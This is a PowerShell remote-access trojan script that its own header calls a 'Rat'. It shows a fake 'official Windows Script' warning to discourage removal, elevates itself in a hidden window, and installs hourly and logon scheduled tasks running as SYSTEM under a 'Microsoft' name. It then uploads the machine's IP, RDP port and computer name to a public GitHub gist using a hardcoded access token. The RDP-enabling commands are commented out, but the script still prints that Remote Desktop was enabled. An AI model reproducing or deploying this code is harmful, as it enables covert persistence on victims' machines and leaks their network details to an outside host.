param (
    [string]$run
)
####################################################################################################
# Authors: github.com/NetConnectors
# Description: Rat
####################################################################################################

#Check if the script is running with params
if ($run -ne "o" -and $run -ne "init") {
    Write-Host "###############################################"
    Write-Host "# This is an official Windows Script          #"
    Write-Host "# DO NOT REMOVE/MODIFY THIS FILE!             #"
    Write-Host "# DO NOT MODIFY THIS FILE!                    #"
    Write-Host "###############################################"
    Exit
}


function Startup {
    # Make sure the script is running as an administrator
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
        Exit
    }

    # Check if the script is running in a Windows environment
    if ($env:OS -ne "Windows_NT") {
        Write-Host "Not Supported"
        Exit
    }
}

function init {
    schtasks /create /sc HOURLY /tn "Microsoft\Rat" /tr "powershell $PSCommandPath -run o" /ru "SYSTEM" /f | out-null
    schtasks /create /sc ONLOGON /tn "Microsoft\RatLogon" /tr "powershell $PSCommandPath -run o" /ru "SYSTEM" /f | out-null
}

function Enable-RemoteDesktop {
    # Enable Remote Desktop
    #Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
#
    ## Enable Remote Desktop Firewall Rule
    #Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

    Write-Output "Remote Desktop has been enabled."
}

function Create-Gist {
    param (
        [string]$Token
    )

    # Get IP address, port, and network name
    $ip = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq "Ethernet" }).IPAddress
    $port = 3389
    $networkName = (Get-WmiObject -Class Win32_ComputerSystem).Name
    $networkName = $networkName -replace " ", "_"

    # Create Gist content
    $gistContent = @{
        description = "RDP"
        public = $true
        files = @{
            "RDP.txt" = @{
                content = "IP: $ip`nPort: $port`nNetwork Name: $networkName"
            }
        }
    } | ConvertTo-Json

    # Create Gist via GitHub API
    $response = Invoke-RestMethod -Uri "https://api.github.com/gists" -Method Post -Headers @{
        Authorization = "token $Token"
        "User-Agent" = "PowerShell"
    } -Body $gistContent

    Write-Output "Gist created: $($response.html_url)"
}

function exec {
    #Enable-RemoteDesktop
    $Token = "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"
    Create-Gist -Token $Token
}

function main {
    $ProgressPreference = 'SilentlyContinue'
    Startup
    if ($run -eq "init") {
        init
        Enable-RemoteDesktop
        exec
    } 
    if ($run -eq "o") {
        exec
    }

    $ProgressPreference = 'Continue'
    Exit
}

main